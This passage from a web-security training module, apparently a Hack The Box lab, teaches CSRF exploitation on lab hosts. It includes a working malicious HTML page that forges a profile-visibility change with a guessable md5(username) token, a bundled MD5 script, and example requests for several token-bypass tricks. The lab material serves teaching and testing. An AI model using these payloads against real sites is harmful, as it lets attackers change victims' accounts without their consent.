+<p>The script snippet above sends the request with one param called <em>csrf</em> having the value of the <em>token</em> variable, which is essentially the victim's CSRF token, and another parameter called <em>action</em> with the value <em>change</em>. These are the two parameters that we noticed while inspecting the targeted request through Burp.</p>
+<p><img src="storage\modules\153\56.png" alt="image"></p>
+<p>Let us try to make a victim's profile public.</p>
+<p>First, submit the full payload to the <em>Country</em> field of Ela Stienen's profile and click "Save".</p>
+<p><img src="storage\modules\153\44.png" alt="image"></p>
+<p>Open a <code>New Private Window</code>, navigate to <code>http://minilab.htb.net</code> again and log in to the application using the credentials below:</p>
+<ul>
+<li>Email: goldenpeacock467</li>
+<li>Password: topcat</li>
+</ul>
+<p>This is a user that has its profile "private." No "Share" functionality exists.</p>
+<p><img src="storage\modules\153\58.png" alt="image"></p>
+<p>Open a new tab and browse Ela Stienen's public profile by navigating to the link below.</p>
+<p><code>http://minilab.htb.net/profile?email=ela.stienen@example.com</code></p>
+<p>This is what the victim will come across.</p>
+<p><img src="storage\modules\153\46.png" alt="image"></p>
+<p>Now, if you go back to the victim's usual profile page and refresh/reload the page, you should see that his profile became "public" (notice the "Share" button that appeared).</p>
+<p><img src="storage\modules\153\59.png" alt="image"></p>
+<p>You just executed a CSRF attack through XSS, bypassing the same origin/same site protections in place!</p>
+<h2 id="exploiting-weak-csrf-tokens">Exploiting Weak CSRF Tokens</h2>
+<hr>
+<p>Often, web applications do not employ very secure or robust token generation algorithms. An example is an application that generates CSRF tokens as follows (pseudocode): <code>md5(username)</code>.</p>
+<p>How can we tell if that is the case? We can register an account, look into the requests to identify a CSRF token, and then check if the MD5 hash of the username is equal to the CSRF token's value.</p>
+<p>Let us see this in action!</p>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (<code>csrf.htb.net</code>) to access the application.</p>
+<p>Navigate to <code>http://csrf.htb.net</code> and log in to the application using the credentials below:</p>
+<ul>
+<li>Email: goldenpeacock467</li>
+<li>Password: topcat</li>
+</ul>
+<p>Open Web Developer Tools (Shift+Ctrl+I in the case of Firefox) and focus on the <em>Network</em> tab.</p>
+<p>Back to the user's profile, press <em>Change Visibility</em> and then <em>Make Public</em>.</p>
+<p>You should see a request similar to the one below. Note the value of the CSRF token.</p>
+<p><img src="storage\modules\153\49.png" alt="image"></p>
+<p>Execute the below command to calculate the MD5 hash of the string "goldenpeacock467" (the username).</p>
+<p>Exploiting Weak CSRF Tokens</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ echo -n goldenpeacock467 | md5sum
+<span class="hljs-number">0</span>bef12f8998057a7656043b6d30c90a2  -
+</code></pre>
+<p>You will notice that the resulting hash is the same as the CSRF value! This means that the CSRF token is generated by MD5-hashing the username.</p>
+<p>When assessing how robust a CSRF token generation mechanism is, make sure you spend a small amount of time trying to come up with the CSRF token generation mechanism. It can be as easy as <code>md5(username)</code>, <code>sha1(username)</code>, <code>md5(current date + username)</code> etc. Please note that you should not spend much time on this, but it is worth a shot.</p>
+<p>Now that we know how the CSRF token for this action is generated let us see how we can attack other users through CSRF.</p>
+<p>Find below the malicious page. Save it as <code>press_start_2_win.html</code></p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"IE=edge"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"referrer"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"never"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Proof-of-concept<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"styles.css"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./md5.min.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> Click Start to win!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"trigger()"</span>&gt;</span>Start!<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+        <span class="hljs-keyword">let</span> host = <span class="hljs-string">'http://csrf.htb.net'</span>
+
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger</span>(<span class="hljs-params"></span>)</span>{
+            <span class="hljs-comment">// Creating/Refreshing the token in server side.</span>
+            <span class="hljs-built_in">window</span>.open(<span class="hljs-string">`<span class="hljs-subst">${host}</span>/app/change-visibility`</span>)
+            <span class="hljs-built_in">window</span>.setTimeout(startPoc, <span class="hljs-number">2000</span>)
+        }
+
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">startPoc</span>(<span class="hljs-params"></span>) </span>{
+            <span class="hljs-comment">// Setting the username</span>
+            <span class="hljs-keyword">let</span> hash = md5(<span class="hljs-string">"crazygorilla983"</span>)
+
+            <span class="hljs-built_in">window</span>.location = <span class="hljs-string">`<span class="hljs-subst">${host}</span>/app/change-visibility/confirm?csrf=<span class="hljs-subst">${hash}</span>&amp;action=change`</span>
+        }
+    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<p>For your malicious page to have MD5-hashing functionality, save the below as <code>md5.min.js</code> and place it in the directory where the malicious page resides.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">!function(<span class="hljs-built_in">n</span>){<span class="hljs-string">"use strict"</span>;function d(<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>){<span class="hljs-built_in">var</span> r=(<span class="hljs-number">65535</span>&amp;<span class="hljs-built_in">n</span>)+(<span class="hljs-number">65535</span>&amp;<span class="hljs-built_in">t</span>);return(<span class="hljs-built_in">n</span>&gt;&gt;<span class="hljs-number">16</span>)+(<span class="hljs-built_in">t</span>&gt;&gt;<span class="hljs-number">16</span>)+(r&gt;&gt;<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">16</span>|<span class="hljs-number">65535</span>&amp;r}function f(<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>,r,e,o,u){return d((u=d(d(<span class="hljs-built_in">t</span>,<span class="hljs-built_in">n</span>),d(e,u)))&lt;&lt;o|u&gt;&gt;&gt;<span class="hljs-number">32</span>-o,r)}function l(<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>,r,e,o,u,c){return f(<span class="hljs-built_in">t</span>&amp;r|~<span class="hljs-built_in">t</span>&amp;e,<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>,o,u,c)}function g(<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>,r,e,o,u,c){return f(<span class="hljs-built_in">t</span>&amp;e|r&amp;~e,<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>,o,u,c)}function v(<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>,r,e,o,u,c){return f(<span class="hljs-built_in">t</span>^r^e,<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>,o,u,c)}function m(<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>,r,e,o,u,c){return f(r^(<span class="hljs-built_in">t</span>|~e),<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>,o,u,c)}function c(<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>){<span class="hljs-built_in">var</span> r,e,o,u;<span class="hljs-built_in">n</span>[<span class="hljs-built_in">t</span>&gt;&gt;<span class="hljs-number">5</span>]|=<span class="hljs-number">128</span>&lt;&lt;<span class="hljs-built_in">t</span>%<span class="hljs-number">32</span>,<span class="hljs-built_in">n</span>[<span class="hljs-number">14</span>+(<span class="hljs-built_in">t</span>+<span class="hljs-number">64</span>&gt;&gt;&gt;<span class="hljs-number">9</span>&lt;&lt;<span class="hljs-number">4</span>)]=<span class="hljs-built_in">t</span>;for(<span class="hljs-built_in">var</span> c=<span class="hljs-number">1732584193</span>,f=-<span class="hljs-number">271733879</span>,i=-<span class="hljs-number">1732584194</span>,a=<span class="hljs-number">271733878</span>,h=<span class="hljs-number">0</span>;h&lt;n.length;h+=<span class="hljs-number">16</span>)c=l(r=c,e=f,o=i,u=a,<span class="hljs-built_in">n</span>[h],<span class="hljs-number">7</span>,-<span class="hljs-number">680876936</span>),a=l(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">1</span>],<span class="hljs-number">12</span>,-<span class="hljs-number">389564586</span>),i=l(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">2</span>],<span class="hljs-number">17</span>,<span class="hljs-number">606105819</span>),f=l(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">3</span>],<span class="hljs-number">22</span>,-<span class="hljs-number">1044525330</span>),c=l(c,f,i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">4</span>],<span class="hljs-number">7</span>,-<span class="hljs-number">176418897</span>),a=l(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">5</span>],<span class="hljs-number">12</span>,<span class="hljs-number">1200080426</span>),i=l(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">6</span>],<span class="hljs-number">17</span>,-<span class="hljs-number">1473231341</span>),f=l(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">7</span>],<span class="hljs-number">22</span>,-<span class="hljs-number">45705983</span>),c=l(c,f,i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">8</span>],<span class="hljs-number">7</span>,<span class="hljs-number">1770035416</span>),a=l(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">9</span>],<span class="hljs-number">12</span>,-<span class="hljs-number">1958414417</span>),i=l(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">10</span>],<span class="hljs-number">17</span>,-<span class="hljs-number">42063</span>),f=l(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">11</span>],<span class="hljs-number">22</span>,-<span class="hljs-number">1990404162</span>),c=l(c,f,i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">12</span>],<span class="hljs-number">7</span>,<span class="hljs-number">1804603682</span>),a=l(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">13</span>],<span class="hljs-number">12</span>,-<span class="hljs-number">40341101</span>),i=l(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">14</span>],<span class="hljs-number">17</span>,-<span class="hljs-number">1502002290</span>),c=g(c,f=l(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">15</span>],<span class="hljs-number">22</span>,<span class="hljs-number">1236535329</span>),i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">1</span>],<span class="hljs-number">5</span>,-<span class="hljs-number">165796510</span>),a=g(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">6</span>],<span class="hljs-number">9</span>,-<span class="hljs-number">1069501632</span>),i=g(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">11</span>],<span class="hljs-number">14</span>,<span class="hljs-number">643717713</span>),f=g(f,i,a,c,<span class="hljs-built_in">n</span>[h],<span class="hljs-number">20</span>,-<span class="hljs-number">373897302</span>),c=g(c,f,i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">5</span>],<span class="hljs-number">5</span>,-<span class="hljs-number">701558691</span>),a=g(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">10</span>],<span class="hljs-number">9</span>,<span class="hljs-number">38016083</span>),i=g(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">15</span>],<span class="hljs-number">14</span>,-<span class="hljs-number">660478335</span>),f=g(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">4</span>],<span class="hljs-number">20</span>,-<span class="hljs-number">405537848</span>),c=g(c,f,i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">9</span>],<span class="hljs-number">5</span>,<span class="hljs-number">568446438</span>),a=g(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">14</span>],<span class="hljs-number">9</span>,-<span class="hljs-number">1019803690</span>),i=g(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">3</span>],<span class="hljs-number">14</span>,-<span class="hljs-number">187363961</span>),f=g(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">8</span>],<span class="hljs-number">20</span>,<span class="hljs-number">1163531501</span>),c=g(c,f,i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">13</span>],<span class="hljs-number">5</span>,-<span class="hljs-number">1444681467</span>),a=g(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">2</span>],<span class="hljs-number">9</span>,-<span class="hljs-number">51403784</span>),i=g(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">7</span>],<span class="hljs-number">14</span>,<span class="hljs-number">1735328473</span>),c=v(c,f=g(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">12</span>],<span class="hljs-number">20</span>,-<span class="hljs-number">1926607734</span>),i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">5</span>],<span class="hljs-number">4</span>,-<span class="hljs-number">378558</span>),a=v(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">8</span>],<span class="hljs-number">11</span>,-<span class="hljs-number">2022574463</span>),i=v(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">11</span>],<span class="hljs-number">16</span>,<span class="hljs-number">1839030562</span>),f=v(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">14</span>],<span class="hljs-number">23</span>,-<span class="hljs-number">35309556</span>),c=v(c,f,i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">1</span>],<span class="hljs-number">4</span>,-<span class="hljs-number">1530992060</span>),a=v(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">4</span>],<span class="hljs-number">11</span>,<span class="hljs-number">1272893353</span>),i=v(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">7</span>],<span class="hljs-number">16</span>,-<span class="hljs-number">155497632</span>),f=v(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">10</span>],<span class="hljs-number">23</span>,-<span class="hljs-number">1094730640</span>),c=v(c,f,i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">13</span>],<span class="hljs-number">4</span>,<span class="hljs-number">681279174</span>),a=v(a,c,f,i,<span class="hljs-built_in">n</span>[h],<span class="hljs-number">11</span>,-<span class="hljs-number">358537222</span>),i=v(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">3</span>],<span class="hljs-number">16</span>,-<span class="hljs-number">722521979</span>),f=v(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">6</span>],<span class="hljs-number">23</span>,<span class="hljs-number">76029189</span>),c=v(c,f,i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">9</span>],<span class="hljs-number">4</span>,-<span class="hljs-number">640364487</span>),a=v(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">12</span>],<span class="hljs-number">11</span>,-<span class="hljs-number">421815835</span>),i=v(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">15</span>],<span class="hljs-number">16</span>,<span class="hljs-number">530742520</span>),c=m(c,f=v(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">2</span>],<span class="hljs-number">23</span>,-<span class="hljs-number">995338651</span>),i,a,<span class="hljs-built_in">n</span>[h],<span class="hljs-number">6</span>,-<span class="hljs-number">198630844</span>),a=m(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">7</span>],<span class="hljs-number">10</span>,<span class="hljs-number">1126891415</span>),i=m(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">14</span>],<span class="hljs-number">15</span>,-<span class="hljs-number">1416354905</span>),f=m(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">5</span>],<span class="hljs-number">21</span>,-<span class="hljs-number">57434055</span>),c=m(c,f,i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">12</span>],<span class="hljs-number">6</span>,<span class="hljs-number">1700485571</span>),a=m(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">3</span>],<span class="hljs-number">10</span>,-<span class="hljs-number">1894986606</span>),i=m(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">10</span>],<span class="hljs-number">15</span>,-<span class="hljs-number">1051523</span>),f=m(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">1</span>],<span class="hljs-number">21</span>,-<span class="hljs-number">2054922799</span>),c=m(c,f,i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">8</span>],<span class="hljs-number">6</span>,<span class="hljs-number">1873313359</span>),a=m(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">15</span>],<span class="hljs-number">10</span>,-<span class="hljs-number">30611744</span>),i=m(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">6</span>],<span class="hljs-number">15</span>,-<span class="hljs-number">1560198380</span>),f=m(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">13</span>],<span class="hljs-number">21</span>,<span class="hljs-number">1309151649</span>),c=m(c,f,i,a,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">4</span>],<span class="hljs-number">6</span>,-<span class="hljs-number">145523070</span>),a=m(a,c,f,i,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">11</span>],<span class="hljs-number">10</span>,-<span class="hljs-number">1120210379</span>),i=m(i,a,c,f,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">2</span>],<span class="hljs-number">15</span>,<span class="hljs-number">718787259</span>),f=m(f,i,a,c,<span class="hljs-built_in">n</span>[h+<span class="hljs-number">9</span>],<span class="hljs-number">21</span>,-<span class="hljs-number">343485551</span>),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function i(<span class="hljs-built_in">n</span>){for(<span class="hljs-built_in">var</span> <span class="hljs-built_in">t</span>=<span class="hljs-string">""</span>,r=<span class="hljs-number">32</span>*n.length,e=<span class="hljs-number">0</span>;e&lt;r;e+=<span class="hljs-number">8</span>)<span class="hljs-built_in">t</span>+=String.fromCharCode(<span class="hljs-built_in">n</span>[e&gt;&gt;<span class="hljs-number">5</span>]&gt;&gt;&gt;e%<span class="hljs-number">32</span>&amp;<span class="hljs-number">255</span>);return <span class="hljs-built_in">t</span>}function a(<span class="hljs-built_in">n</span>){<span class="hljs-built_in">var</span> <span class="hljs-built_in">t</span>=[];for(<span class="hljs-built_in">t</span>[(n.length&gt;&gt;<span class="hljs-number">2</span>)-<span class="hljs-number">1</span>]=void <span class="hljs-number">0</span>,e=<span class="hljs-number">0</span>;e&lt;t.length;e+=<span class="hljs-number">1</span>)<span class="hljs-built_in">t</span>[e]=<span class="hljs-number">0</span>;for(<span class="hljs-built_in">var</span> r=<span class="hljs-number">8</span>*n.length,e=<span class="hljs-number">0</span>;e&lt;r;e+=<span class="hljs-number">8</span>)<span class="hljs-built_in">t</span>[e&gt;&gt;<span class="hljs-number">5</span>]|=(<span class="hljs-number">255</span>&amp;n.charCodeAt(e/<span class="hljs-number">8</span>))&lt;&lt;e%<span class="hljs-number">32</span>;return <span class="hljs-built_in">t</span>}function e(<span class="hljs-built_in">n</span>){for(<span class="hljs-built_in">var</span> <span class="hljs-built_in">t</span>,r=<span class="hljs-string">"0123456789abcdef"</span>,e=<span class="hljs-string">""</span>,o=<span class="hljs-number">0</span>;o&lt;n.length;o+=<span class="hljs-number">1</span>)<span class="hljs-built_in">t</span>=n.charCodeAt(o),e+=r.charAt(<span class="hljs-built_in">t</span>&gt;&gt;&gt;<span class="hljs-number">4</span>&amp;<span class="hljs-number">15</span>)+r.charAt(<span class="hljs-number">15</span>&amp;<span class="hljs-built_in">t</span>);return e}function r(<span class="hljs-built_in">n</span>){return unescape(encodeURIComponent(<span class="hljs-built_in">n</span>))}function o(<span class="hljs-built_in">n</span>){return i(c(a(<span class="hljs-built_in">n</span>=r(<span class="hljs-built_in">n</span>)),<span class="hljs-number">8</span>*n.length))}function u(<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>){return function(<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>){<span class="hljs-built_in">var</span> r,e=a(<span class="hljs-built_in">n</span>),o=[],u=[];for(o[<span class="hljs-number">15</span>]=u[<span class="hljs-number">15</span>]=void <span class="hljs-number">0</span>,<span class="hljs-number">16</span>&lt;e.length&amp;&amp;(e=c(e,<span class="hljs-number">8</span>*n.length)),r=<span class="hljs-number">0</span>;r&lt;<span class="hljs-number">16</span>;r+=<span class="hljs-number">1</span>)o[r]=<span class="hljs-number">909522486</span>^e[r],u[r]=<span class="hljs-number">1549556828</span>^e[r];return <span class="hljs-built_in">t</span>=c(o.concat(a(<span class="hljs-built_in">t</span>)),<span class="hljs-number">512</span>+<span class="hljs-number">8</span>*t.length),i(c(u.concat(<span class="hljs-built_in">t</span>),<span class="hljs-number">640</span>))}(r(<span class="hljs-built_in">n</span>),r(<span class="hljs-built_in">t</span>))}function <span class="hljs-built_in">t</span>(<span class="hljs-built_in">n</span>,<span class="hljs-built_in">t</span>,r){return <span class="hljs-built_in">t</span>?r?u(<span class="hljs-built_in">t</span>,<span class="hljs-built_in">n</span>)<span class="hljs-symbol">:e</span>(u(<span class="hljs-built_in">t</span>,<span class="hljs-built_in">n</span>))<span class="hljs-symbol">:r</span>?o(<span class="hljs-built_in">n</span>)<span class="hljs-symbol">:e</span>(o(<span class="hljs-built_in">n</span>))}<span class="hljs-string">"function"</span>==typeof define&amp;&amp;define.amd?define(function(){return <span class="hljs-built_in">t</span>})<span class="hljs-symbol">:</span><span class="hljs-string">"object"</span>==typeof module&amp;&amp;module.exports?module.exports=<span class="hljs-symbol">t:n</span>.<span class="hljs-symbol">md5</span>=<span class="hljs-built_in">t</span>}(this);
+//# sourceMappingURL=<span class="hljs-symbol">md5</span>.min.js.map
+</code></pre>
+<p>We can serve the page and JavaScript code above from our attacking machine as follows.</p>
+<p>Exploiting Weak CSRF Tokens</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python -m http.server <span class="hljs-number">1337</span>
+Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> port <span class="hljs-number">1337</span> (http://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">1337</span>/) ...
+</code></pre>
+<p>Open a <code>New Private Window</code>, navigate to <code>http://csrf.htb.net</code> and log in to the application using the credentials below:</p>
+<ul>
+<li>Email: crazygorilla983</li>
+<li>Password: pisces</li>
+</ul>
+<p>This account will play the role of the victim. As you can see, Ela Stienen's profile is not public. Let us try to make it public through a CSRF attack.</p>
+<p>While still logged in as Ela Stienen, open a new tab and visit the page you are serving from your attacking machine <code>http://&lt;VPN/TUN Adapter IP&gt;:1337/press_start_2_win.html</code>.</p>
+<p><img src="storage\modules\153\60.png" alt="image"></p>
+<p>Now press "Start!". You will notice that when Ela Stienen presses "Start," her profile will become public!</p>
+<p><img src="storage\modules\153\61.png" alt="image"></p>
+<p>The following section will focus on some possible CSRF protection bypasses that you should try during web application penetration tests or bug bounty hunting.</p>
+<h2 id="additional-csrf-protection-bypasses">Additional CSRF Protection Bypasses</h2>
+<hr>
+<p>Even though diving deeper into CSRF protection bypasses is out of this module's scope, find below some approaches that may prove helpful during engagements or bug bounty hunting.</p>
+<h3 id="null-value">Null Value</h3>
+<hr>
+<p>You can try making the CSRF token a null value (empty), for example:</p>
+<p><code>CSRF-Token:</code></p>
+<p>This may work because sometimes, the check is only looking for the header, and it does not validate the token value. In such cases, we can craft our cross-site requests using a null CSRF token, as long as the header is provided in the request.</p>
+<h3 id="random-csrf-token">Random CSRF Token</h3>
+<hr>
+<p>Setting the CSRF token value to the same length as the original CSRF token but with a different/random value may also bypass some anti-CSRF protection that validates if the token has a value and the length of that value. For example, if the CSRF-Token were 32-bytes long, we would re-create a 32-byte token.</p>
+<p>Real:</p>
+<p><code>CSRF-Token: 9cfffd9e8e78bd68975e295d1b3d3331</code></p>
+<p>Fake:</p>
+<p><code>CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3</code></p>
+<h3 id="use-another-session-s-csrf-token">Use Another Session’s CSRF Token</h3>
+<hr>
+<p>Another anti-CSRF protection bypass is using the same CSRF token across accounts. This may work in applications that do not validate if the CSRF token is tied to a specific account or not and only check if the token is algorithmically correct.</p>
+<p>Create two accounts and log into the first account. Generate a request and capture the CSRF token. Copy the token's value, for example, <code>CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331</code>.</p>
+<p>Log into the second account and change the value of <em>CSRF-Token</em> to <code>9cfffd9e8e78bd68975e295d1b3d3331</code> while issuing the same (or a different) request. If the request is issued successfully, we can successfully execute CSRF attacks using a token generated through our account that is considered valid across multiple accounts.</p>
+<h3 id="request-method-tampering">Request Method Tampering</h3>
+<hr>
+<p>To bypass anti-CSRF protections, we can try changing the request method. From <em>POST</em> to <em>GET</em> and vice versa.</p>
+<p>For example, if the application is using POST, try changing it to GET:</p>
+<p>Code: http</p>
+<pre><code class="lang-http">POST /change_password
+POST body:<span class="hljs-type"></span>
+<span class="hljs-keyword">new</span><span class="hljs-type">_password</span>=pwned&amp;confirm_new<span class="hljs-type"></span>=pwned
+</code></pre>
+<p>Code: http</p>
+<pre><code class="lang-http">GET /change_password?<span class="hljs-keyword">new</span><span class="hljs-type">_password</span>=pwned&amp;confirm_new<span class="hljs-type"></span>=pwned
+</code></pre>
+<p>Unexpected requests may be served without the need for a CSRF token.</p>
+<h3 id="delete-the-csrf-token-parameter-or-send-a-blank-token">Delete the CSRF token parameter or send a blank token</h3>
+<hr>
+<p>Not sending a token works fairly often because of the following common application logic mistake. Applications sometimes only check the token's validity if the token exists or if the token parameter is not blank.</p>
+<p>Real Request:</p>
+<p>Code: http</p>
+<pre><code class="lang-http">POST /change_password
+POST body:<span class="hljs-type"></span>
+<span class="hljs-keyword">new</span><span class="hljs-type">_password</span>=qwerty&amp;csrf_token=<span class="hljs-number">9</span>cfffd9e8e78bd68975e295d1b3d3331
+</code></pre>
+<p>Try:</p>
+<p>Code: http</p>
+<pre><code class="lang-http">POST /change_password
+POST body:<span class="hljs-type"></span>
+<span class="hljs-keyword">new</span><span class="hljs-type">_password</span>=qwerty
+</code></pre>
+<p>Or:</p>
+<p>Code: http</p>
+<pre><code class="lang-http">POST /change_password
+POST body:<span class="hljs-type"></span>
+<span class="hljs-keyword">new</span><span class="hljs-type">_password</span>=qwerty&amp;csrf_token=
+</code></pre>
+<h3 id="session-fixation-csrf">Session Fixation &gt; CSRF</h3>
+<hr>
+<p>Sometimes, sites use something called a double-submit cookie as a defense against CSRF. This means that the sent request will contain the same random token both as a cookie and as a request parameter, and the server checks if the two values are equal. If the values are equal, the request is considered legitimate.</p>
+<p>If the double-submit cookie is used as the defense mechanism, the application is probably not keeping the valid token on the server-side. It has no way of knowing if any token it receives is legitimate and merely checks that the token in the cookie and the token in the request body are the same.</p>
+<p>If this is the case and a session fixation vulnerability exists, an attacker could perform a successful CSRF attack as follows:</p>
+<p>Steps:</p>
+<ol>
+<li>Session fixation</li>
+<li>Execute CSRF with the following request:</li>
+</ol>
+<p>Code: http</p>
+<pre><code class="lang-http"><span class="hljs-keyword">POST</span> /change_password
+Cookie: CSRF-<span class="hljs-keyword">Token</span>=fixed_token;
+<span class="hljs-keyword">POST</span> body:
+new_password=pwned&amp;CSRF-<span class="hljs-keyword">Token</span>=fixed_token
